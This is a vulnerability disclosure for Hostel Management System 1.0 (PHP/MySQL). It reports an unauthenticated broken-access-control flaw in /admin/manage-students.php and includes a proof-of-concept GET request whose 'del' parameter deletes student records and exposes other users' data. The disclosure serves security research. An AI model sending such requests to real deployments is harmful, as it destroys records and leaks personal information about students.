## Vulnerability Details

**Credits**:
  > Paul Rivera: (https://github.com/blackslim3)<br/>

**Tested On**:
  > Hostel Management System using PHP and MySQL 1.0 : https://github.com/Surya2Developer/Hostel_Management_System/

**Affected Version**:
  > Hostel Management System using PHP and MySQL 1.0

**Affected Site Page**:
  > /admin/manage-students.php

**Affected Code**:
  > manage-students.php

**Related CWE**:
  > CWE-284: Improper Access Control: https://cwe.mitre.org/data/definitions/284.html

## **Details**:
  > Broken access controls allow users to access resources or perform actions they should not be able to.
![image](https://github.com/blackslim3/cve_sidequest/blob/main/poc/assets/manage-students.png)

  Replace the value of the `del` parameter to any value from 1-10, then send the request. 

```http
GET /hostel/admin/manage-students.php?del=8 HTTP/1.1
    Host: localhost
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
```
    Notice the 'Data Deleted' alert indicating the registered student is deleted. Additionally on the HTTP response, all the remaining registered users along with their information can be viewed.
![image](https://github.com/blackslim3/cve_sidequest/blob/main/poc/assets/unauthenticated_deleteStudent_datadeleted.png)
![image](https://github.com/blackslim3/cve_sidequest/blob/main/poc/assets/information%20disclosure_manageStudents.png)

## **Vulnerability Impact**:
    Allows an unauthenticated attacker to delete registered users and view all the remaining registered users.
    
